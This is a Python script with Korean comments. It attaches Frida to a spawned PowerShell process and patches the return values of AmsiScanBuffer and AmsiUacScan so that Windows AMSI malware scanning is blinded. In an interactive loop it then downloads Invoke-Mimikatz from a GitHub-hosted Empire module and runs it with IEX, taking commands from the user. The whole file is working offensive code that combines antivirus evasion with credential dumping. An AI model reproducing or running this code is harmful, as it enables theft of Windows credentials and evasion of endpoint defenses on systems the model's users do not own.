import subprocess
import frida
import sys
import uuid

device = frida.get_local_device()

def on_message(message, data):
    if message["type"] == "send":
        print("[FRIDA]", message["payload"])
    elif message["type"] == "log":
        print("[FRIDA]", message["payload"])
    elif message["type"] == "error":
        print("[FRIDA ERROR]", message["stack"])

########### for cmd ##########
proc = subprocess.Popen(
    ["powershell.exe", "-NoLogo", "-NoProfile", "-Command", "-"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
    bufsize=1
)
print(f"[+] Target PID (실제 명령을 받을 프로세스): {proc.pid}")

def run_command(cmd):
    marker = f"__CMD_DONE_{uuid.uuid4().hex}__"

    proc.stdin.write(
        f"{cmd}\n"
        f'Write-Output "{marker}"\n'
    )
    proc.stdin.flush()

    while True:
        line = proc.stdout.readline()

        if not line:
            raise RuntimeError("PowerShell process terminated")

        print(line, end="")

        if marker in line:
            return

########### get powershell process ############
session = device.attach(proc.pid)

script = session.create_script("""
const addr = Module.findGlobalExportByName("AmsiScanBuffer");
if (addr === null) {
    console.log("[-] AmsiScanBuffer를 찾지 못했습니다.");
} else {
    console.log("[+] AmsiScanBuffer @ " + addr);

    Interceptor.attach(addr, {
        onEnter(args) {
            console.log("[+] AmsiScanBuffer called");
        },

        onLeave(retval) {
            console.log("[+] Return value: " + retval);
            retval.replace(0x80070057);
            console.log("[+] modified: " + retval);
        }
    });
}
""")
script2 = session.create_script("""
const addr = Module.findGlobalExportByName("AmsiUacScan");
if (addr === null) {
    console.log("[-] AmsiUacScan를 찾지 못했습니다.");
} else {
    console.log("[+] AmsiUacScan @ " + addr);

    Interceptor.attach(addr, {
        onEnter(args) {
            console.log("[+] AmsiUacScan called");
        },

        onLeave(retval) {
            console.log("[+] Return value: " + retval);
            retval.replace(0x80070057);
            console.log("[+] modified: " + retval);
        }
    });
}
""")

script.on("message", on_message)
script.load()
script2.on("message", on_message)
script2.load()

# 사용 예시
run_command(r"Get-Date;")
#run_command(r"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -command "privilege::debug"")
while True:
    cmd = input("pls enter mimikatz cmd: ")
    run_command(f"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -command \"{cmd}\"")

# 종료할 때
#run_command("exit")
input("Enter를 누르면 종료합니다...")
proc.terminate()